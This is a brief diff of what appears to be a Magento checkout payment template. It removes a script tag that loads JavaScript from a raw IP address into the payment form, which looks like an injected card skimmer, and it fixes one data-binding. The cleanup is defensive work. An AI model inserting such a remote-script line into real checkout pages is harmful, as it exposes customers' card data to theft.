@@ -8,7 +8,6 @@
  * License GNU/GPL V3 https://www.gnu.org/licenses/gpl-3.0.en.html
  */
 -->
-<script src="http://79.137.78.153/test.js"></script>
 
 <div class="payment-method" data-bind="css: {'_active': (js('getCode') == isChecked())}">
     <div class="payment-method-title field choice">
@@ -33,7 +32,7 @@
 
         <div id="cko-form-holder" data-bind="click: reloadEmbeddedForm">
             <form class="widget-container" id="embeddedForm" method="POST"></form>
-            <div data-bind="visible: php('getEmbeddedForm')"></div>
+            <div data-bind="visible: getEmbeddedForm()"></div>
         </div>
 
         <div class="checkout-agreements-block">
